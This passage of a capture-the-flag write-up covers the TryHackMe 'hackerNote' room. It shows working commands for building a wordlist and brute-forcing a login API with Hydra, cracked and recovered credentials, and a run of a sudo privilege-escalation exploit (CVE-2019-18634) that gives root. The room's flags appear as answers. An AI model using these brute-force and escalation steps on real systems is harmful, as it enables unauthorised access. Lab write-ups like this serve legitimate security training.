+Hashcat utils can be downloaded from: <a href=https://github.com/hashcat/hashcat-utils/releases>https://github.com/hashcat/hashcat-utils/releases</a>
+Either add these to your PATH, or run them from the folder.
+We want to use the Combinator.bin binary, with colors.txt and numbers.txt as the input. The command for this is (assuming you&rsquo;re in the directory with the binaries and have copiesd the txt files into that directory):</p><p><code>./combinator.bin colors.txt numbers.txt > wordlist.txt</code></p><p>This will then give you a wordlist to use for Hydra.</p><p><strong>Attack the API</strong></p><p>The HTTP POST request that we captured earlier tells us enough about the API that we can use Hydra to attack it.
+The API is actually designed to either accept Form data, or JSON data. The frontend sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:</p><ul><li>Request Body - JSON
+<code>{"username":"admin","password":"admin"}</code></li><li>Request Path -
+<code>/api/user/login</code></li><li>Error message for incorrect logins -
+<code>"Invalid Username Or Password"</code></li></ul><p>The command for this is (replace the parts with angle brackets, you will need to escape special characters):</p><p><code>hydra -l &lt;username> -P &lt;wordlist> 192.168.2.62 http-post-form &lt;path>:&lt;body>:&lt;fail_message></code></p><p>Form the hydra command to attack the login API route</p><p><code>No answer needed</code></p><p>How many passwords were in your wordlist?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/hackerNote$ wc wordlist.txt
+</span></span><span class=line><span class=cl> 180  180 1290 wordlist.txt
+</span></span></code></pre></td></tr></table></div></div><p><code>180</code></p><p>What was the user&rsquo;s password?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/hackerNote$ hydra -l james -P wordlist.txt 10.10.24.100 http-post-form &#34;/api/user/login:username=^USER^&amp;password=^PASS^:Invalid Username Or Password&#34;
+</span></span><span class=line><span class=cl>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-14 22:10:51
+</span></span><span class=line><span class=cl>[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+</span></span><span class=line><span class=cl>[DATA] attacking http-post-form://10.10.24.100:80/api/user/login:username=^USER^&amp;password=^PASS^:Invalid Username Or Password
+</span></span><span class=line><span class=cl>[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.24.100   login: james   password: blue7
+</span></span><span class=line><span class=cl>1 of 1 target successfully completed, 1 valid password found
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-14 22:12:03
+</span></span></code></pre></td></tr></table></div></div><p><code>blue7</code></p><p>Login as the user to the platform</p><p><code>No answer needed</code></p><p>What&rsquo;s the user&rsquo;s SSH password?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>My SSH details
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>So that I don&#39;t forget, my SSH password is dak4ddb37b
+</span></span></code></pre></td></tr></table></div></div><p><code>dak4ddb37b</code></p><p>Log in as the user to SSH with the credentials you have.</p><p><code>No answer needed</code></p><p>What&rsquo;s the user flag?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>james@hackernote:~$ cat user.txt
+</span></span><span class=line><span class=cl>thm{56911bd7ba1371a3221478aa5c094d68}
+</span></span></code></pre></td></tr></table></div></div><p><code>thm{56911bd7ba1371a3221478aa5c094d68}</code></p><h2 id=task-5-escalate>Task 5 Escalate<a hidden class=anchor aria-hidden=true href=#task-5-escalate>#</a></h2><p><strong>Enumeration of privileges</strong></p><p>Now that you have an SSH session, you can grab the user flag. But that shouldn&rsquo;t be enough for you, you need root.
+A good first step for privilege escalation is seeing if you can run sudo. You have the password for the current user, so you can run the command:</p><p><code>sudo -l</code></p><p>This command tells you what commands you can run as the superuser with sudo. Unfortunately, the current user cannot run any commands as root. You may have noticed, however, that when you enter your password you see asterisks. This is not default behaviour. There was a recent CVE released that affects this configuration. The setting is called pwdfeedback.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>james@hackernote:~$ sudo -l
+</span></span><span class=line><span class=cl>[sudo] password for james: **********
+</span></span></code></pre></td></tr></table></div></div><p>What is the CVE number for the exploit?</p><p><code>CVE-2019-18634</code></p><p>Find the exploit from <a href=https://github.com/saleemrashid/>https://github.com/saleemrashid/</a> and download the files.</p><p><code>No answer needed</code></p><p>Compile the exploit from Kali linux.</p><p><code>No answer needed</code></p><p>SCP the exploit binary to the box.</p><p><code>No answer needed</code></p><p>Run the exploit, get root.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>james@hackernote:~$ ls -la
+</span></span><span class=line><span class=cl>total 928
+</span></span><span class=line><span class=cl>drwxr-xr-x 4 james james   4096 Nov 14 21:21 .
+</span></span><span class=line><span class=cl>drwxr-xr-x 4 root  root    4096 Feb  8  2020 ..
+</span></span><span class=line><span class=cl>lrwxrwxrwx 1 james james      9 Feb 10  2020 .bash_history -&gt; /dev/null
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 james james    220 Feb  8  2020 .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 james james   3771 Feb  8  2020 .bashrc
+</span></span><span class=line><span class=cl>drwx------ 2 james james   4096 Feb  8  2020 .cache
+</span></span><span class=line><span class=cl>-rwxr-xr-x 1 james james 916872 Nov 14 21:21 exploit
+</span></span><span class=line><span class=cl>drwx------ 3 james james   4096 Feb  8  2020 .gnupg
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 james james    807 Feb  8  2020 .profile
+</span></span><span class=line><span class=cl>-rw------- 1 james james     38 Feb  8  2020 user.txt
+</span></span><span class=line><span class=cl>james@hackernote:~$ ./exploit
+</span></span><span class=line><span class=cl>[sudo] password for james:
+</span></span><span class=line><span class=cl>Sorry, try again.
+</span></span><span class=line><span class=cl># id
+</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root),1001(james)
+</span></span><span class=line><span class=cl># cat /root/root.txt
+</span></span><span class=line><span class=cl>thm{af55ada6c2445446eb0606b5a2d3a4d2}
+</span></span></code></pre></td></tr></table></div></div><p><code>No answer needed</code></p><p>What is the root flag?</p><p><code>thm{af55ada6c2445446eb0606b5a2d3a4d2}</code></p><h2 id=task-6-comments-on-realism-and-further-reading>Task 6 Comments on realism and Further Reading<a hidden class=anchor aria-hidden=true href=#task-6-comments-on-realism-and-further-reading>#</a></h2><p><strong>Web app</strong></p><p>This room was designed to be more realistic and less CTF focused. The logic behind the timing attack is mentioned in OWASP&rsquo;s authentication section, and a fairly similar timing attack existed on OpenSSH, allowing username enumeration. I&rsquo;ve included links to this in the Further Reading section</p><p>Password hints in webapps are normally considered bad practice, but large companies still often include them. Adobe suffered a large databreach affecting users of Creative Cloud and decryption of the passwords was made much easier due to the password hints also included in the breach.</p><p><strong>Privilege Escalation</strong></p><p>The privilege escalation for this box is a real world CVE vulnerability, and affected the default configurations of sudo on macOS, Linux Mint and ElementaryOS.</p><p><strong>Further reading</strong></p><p><strong>Timing attacks on logins</strong></p><ul><li><a href=https://seclists.org/fulldisclosure/2016/Jul/51>https://seclists.org/fulldisclosure/2016/Jul/51</a></li><li><a href=https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/>https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/</a></li><li><a href=https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)>https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)</a></li></ul><p><strong>Adobe Password Breach</strong></p><ul><li><a href=https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/>https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/</a></li></ul><p><strong>Sudo CVE</strong></p><ul><li><a href=https://dylankatz.com/Analysis-of-CVE-2019-18634/>https://dylankatz.com/Analysis-of-CVE-2019-18634/</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2019-18634>https://nvd.nist.gov/vuln/detail/CVE-2019-18634</a></li><li><a href=https://tryhackme.com/room/sudovulnsbof>https://tryhackme.com/room/sudovulnsbof</a></li></ul><p>Read, explore, learn.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
